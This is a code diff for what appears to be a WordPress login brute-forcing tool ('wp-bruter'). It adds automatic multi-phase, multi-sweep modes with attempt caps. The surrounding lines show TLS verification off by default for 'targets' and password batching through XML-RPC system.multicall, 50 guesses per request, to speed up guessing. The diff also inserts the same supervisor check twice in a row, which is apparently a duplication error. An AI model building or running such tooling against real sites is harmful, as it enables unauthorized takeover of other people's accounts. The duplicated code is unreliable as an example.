@@ -63,6 +63,9 @@ var (
 	diagFile     = flag.String("diag-file", "", "Diagnostic log path (empty = <app dir>/debug.log)")
 	verifyTLS    = flag.Bool("verify-tls", false, "Verify TLS certificates (default off: many targets have broken chains)")
 	prepWorkersF = flag.Int("prep-workers", 0, "Pre-flight workers (0 = auto from CPU)")
+	autoRun      = flag.Bool("auto", false, "Walk every phase and sweep automatically (default for a bare ./wp-bruter)")
+	sweeps       = flag.Int("sweeps", 1, "Sweeps in auto mode; stops early once progress stalls")
+	phaseList    = flag.String("phase-list", "150,500,0", "Attempt caps per phase in auto mode")
 	useXMLRPC    = flag.Bool("xmlrpc", true, "Use /xmlrpc.php system.multicall, fall back to /wp-login.php per site")
 	xmlrpcBatch  = flag.Int("xmlrpc-batch", 50, "Passwords per XML-RPC multicall request")
 )
@@ -317,6 +320,16 @@ const workersPerSite = 10
 
 func main() {
 	flag.Parse()
+
+	if wantsSupervisor(flag.Args()) {
+		runSupervised()
+		return
+	}
+
+	if wantsSupervisor(flag.Args()) {
+		runSupervised()
+		return
+	}
 
 	if *uninstall {
 		runUninstall()
